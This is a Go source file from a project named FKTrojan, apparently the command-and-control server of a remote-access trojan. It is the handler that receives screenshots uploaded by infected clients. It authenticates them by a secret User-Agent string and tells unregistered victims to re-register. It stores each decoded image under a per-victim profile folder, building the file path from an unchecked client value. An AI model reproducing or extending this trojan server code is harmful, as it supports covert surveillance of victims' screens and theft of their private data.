/*
Author: FreeKnight
*/
//------------------------------------------------------------
package server

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"database/sql"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

//------------------------------------------------------------
// 创建截屏图片
func ScreenshotHandler(response http.ResponseWriter, request *http.Request) {
	if isEnabled {
		if request.UserAgent() == UserAgentKey {
			request.ParseForm()
			GUID := request.Form.Get("0")
			DATA := request.FormValue("1")
			var tmpguid string
			var tmpint int
			files, _ := ioutil.ReadDir("./Profiles/" + GUID + "/Screenshots")
			tmpint = len(files) + 1
			s1 := strconv.Itoa(tmpint)
			err := DBPointer.QueryRow("SELECT guid FROM clients WHERE guid=?", GUID).Scan(&tmpguid)
			if err == sql.ErrNoRows {
				fmt.Fprintf(response, "spin") // 通知客户端进行重注册
			} else {
				result := strings.Replace(time.Now().Format(time.RFC822), ":", "-", -1)
				writefile, _ := os.Create("./Profiles/" + GUID + "/Screenshots/" + s1 + "." + result + ".png")
				// 例如: 9283.29 Feb 18 23-50 EDT.png
				writefile.WriteString(string(common.Base64Decode(DATA)))
				writefile.Close()
				fmt.Fprintf(response, "done")
			}
		}
	}
}

//------------------------------------------------------------
